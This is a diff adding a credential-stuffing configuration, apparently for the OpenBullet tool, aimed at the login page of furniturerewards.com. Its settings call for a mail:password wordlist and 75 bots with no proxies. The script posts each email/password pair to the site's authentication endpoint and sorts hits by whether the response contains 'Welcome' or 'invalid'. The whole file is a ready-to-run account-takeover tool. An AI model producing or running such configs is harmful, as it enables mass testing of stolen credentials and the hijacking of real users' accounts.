@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "FurnitureRewards",
+  "SuggestedBots": 75,
+  "LastModified": "2018-10-02T09:27:15.9256057+00:00",
+  "AdditionalInfo": "Proxyless shit site with nada to capture | MAX your BOTS | ",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "2",
+      "Id": 1971944168
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "2",
+      "Id": 1547630432
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "http://www.furniturerewards.com/my-account/authentication.php?action=login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: http://www.furniturerewards.com/my-account/index.php?msg=login&checked=2" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "invalid" 
+  KEYCHAIN Success OR 
+    KEY "Welcome" 
